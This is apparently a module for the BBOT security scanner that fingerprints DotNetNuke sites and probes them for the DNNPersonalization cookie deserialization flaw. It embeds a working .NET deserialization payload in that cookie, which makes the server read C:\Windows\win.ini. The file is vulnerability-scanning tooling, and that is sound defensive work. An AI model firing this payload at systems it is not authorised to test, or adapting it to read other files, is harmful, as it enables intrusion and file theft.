import asyncio
from sys import executable
from urllib.parse import urlparse
from bbot.modules.base import BaseModule


class dotnetnuke(BaseModule):
    DNN_signatures_body = [
        "<!-- by DotNetNuke Corporation",
        "<!-- DNN Platform",
        "/js/dnncore.js?cdv",
        'content=",DotNetNuke,DNN',
        "dnn_ContentPane",
        'class="DnnModule"',
    ]
    DNN_signatures_header = ["DNNOutputCache", "X-Compressed-By: DotNetNuke"]
    exploit_probe = {
        "DNNPersonalization": r'<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'
    }

    watched_events = ["HTTP_RESPONSE"]
    produced_events = ["VULNERABILITY", "FINDING"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {"description": "Scan for critical DotNetNuke (DNN) vulnerabilities"}

    async def handle_event(self, event):
        detected = False
        raw_headers = event.data.get("raw_header", None)

        if raw_headers:
            for header_signature in self.DNN_signatures_header:
                if header_signature in raw_headers:
                    self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                    )
                    detected = True
                    break
        resp_body = event.data.get("body", None)
        if resp_body:
            for body_signature in self.DNN_signatures_body:
                if body_signature in resp_body:
                    self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                    )
                    detected = True
                    break

        if detected == True:
            for probe_url in [f'{event.data["url"]}/__', f'{event.data["url"]}/']:
                result = await self.helpers.request(probe_url, cookies=self.exploit_probe)
                if result:
                    if "for 16-bit app support" in result.text and "[extensions]" in result.text:
                        self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke Personalization Cookie Deserialization",
                                "host": str(event.host),
                                "url": probe_url,
                            },
                            "VULNERABILITY",
                            event,
                        )
                        return
